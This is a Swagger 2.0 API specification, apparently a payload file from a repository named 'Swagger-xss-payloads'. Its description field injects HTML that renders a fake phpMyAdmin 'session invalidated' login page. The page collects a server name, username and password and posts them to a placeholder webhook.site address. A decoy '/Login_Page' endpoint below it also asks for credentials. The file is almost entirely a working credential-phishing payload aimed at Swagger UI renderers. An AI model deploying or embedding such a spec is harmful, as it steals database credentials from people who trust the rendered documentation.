swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<table width="100%" cellspacing="0" cellpadding="10"><tr><td bgcolor="#3a5169" align="left"><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-db.png" width="240" height="33" alt="phpMyAdmin 5.2.1"></td></tr></table><br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Segoe UI" size="2" color="#6c757d">Session invalidated. Please log in again to access the database server.</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="1" color="#495057">Server</font><br><input type="text" name="server" size="32" value="mysql-db01.internal:3306"><br><br><font face="Segoe UI" size="1" color="#495057">Username</font><br><input type="text" name="user" size="32" placeholder="root"><br><br><font face="Segoe UI" size="1" color="#495057">Password</font><br><input type="password" name="pass" size="32"><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-db.png" width="76" height="22" alt="Go"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#3a5169">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#cccccc">mysql-db01.internal &middot; MySQL 8.0.36</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
